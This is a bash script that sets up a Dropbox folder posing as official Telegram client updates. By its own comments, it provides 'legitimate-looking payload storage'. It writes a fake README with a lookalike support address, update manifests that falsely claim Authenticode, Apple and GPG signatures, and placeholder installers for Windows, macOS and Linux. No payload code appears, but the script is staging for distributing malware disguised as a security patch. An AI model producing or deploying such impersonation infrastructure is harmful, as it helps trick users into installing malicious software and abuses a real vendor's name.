#!/bin/bash

# Create Dropbox directory structure for legitimate-looking payload storage

# Base directory
mkdir -p ~/Dropbox/Apps/TelegramClientUpdates

# Platform-specific directories with legitimate names
mkdir -p ~/Dropbox/Apps/TelegramClientUpdates/Windows/Security
mkdir -p ~/Dropbox/Apps/TelegramClientUpdates/MacOS/Updates
mkdir -p ~/Dropbox/Apps/TelegramClientUpdates/Linux/Packages

# Create metadata files to appear legitimate
cat > ~/Dropbox/Apps/TelegramClientUpdates/README.txt << EOL
Telegram Desktop Client Updates
Version: 4.12.5
Last Updated: October 8, 2025

This directory contains official Telegram client updates and security patches.
For support, contact: support@telegrams.app
EOL

# Windows update metadata
cat > ~/Dropbox/Apps/TelegramClientUpdates/Windows/Security/update_manifest.json << EOL
{
  "version": "4.12.5",
  "release_date": "2025-10-08",
  "platform": "Windows",
  "min_os_version": "10.0",
  "architecture": ["x86_64", "arm64"],
  "update_type": "security_patch",
  "signature_type": "Authenticode",
  "download_size": "68.5 MB",
  "changelog": "Security improvements and bug fixes"
}
EOL

# MacOS update metadata
cat > ~/Dropbox/Apps/TelegramClientUpdates/MacOS/Updates/update_manifest.json << EOL
{
  "version": "4.12.5",
  "release_date": "2025-10-08",
  "platform": "macOS",
  "min_os_version": "11.0",
  "architecture": ["universal"],
  "update_type": "security_patch",
  "signature_type": "Apple Developer ID",
  "download_size": "72.1 MB",
  "changelog": "Security improvements and bug fixes"
}
EOL

# Linux update metadata
cat > ~/Dropbox/Apps/TelegramClientUpdates/Linux/Packages/update_manifest.json << EOL
{
  "version": "4.12.5",
  "release_date": "2025-10-08",
  "platform": "Linux",
  "distributions": ["Ubuntu", "Debian", "Fedora", "Arch"],
  "architecture": ["amd64", "arm64"],
  "update_type": "security_patch",
  "signature_type": "GPG",
  "download_size": "65.8 MB",
  "changelog": "Security improvements and bug fixes"
}
EOL

# Create legitimate-looking update files (empty placeholders)
touch ~/Dropbox/Apps/TelegramClientUpdates/Windows/Security/TelegramUpdate_4.12.5_win64.exe
touch ~/Dropbox/Apps/TelegramClientUpdates/MacOS/Updates/TelegramUpdate_4.12.5.dmg
touch ~/Dropbox/Apps/TelegramClientUpdates/Linux/Packages/telegram-desktop_4.12.5_amd64.deb

# Set correct permissions
chmod 644 ~/Dropbox/Apps/TelegramClientUpdates/README.txt
chmod 644 ~/Dropbox/Apps/TelegramClientUpdates/**/update_manifest.json
chmod 644 ~/Dropbox/Apps/TelegramClientUpdates/**/*.exe
chmod 644 ~/Dropbox/Apps/TelegramClientUpdates/**/*.dmg
chmod 644 ~/Dropbox/Apps/TelegramClientUpdates/**/*.deb

echo "Dropbox directory structure created successfully!"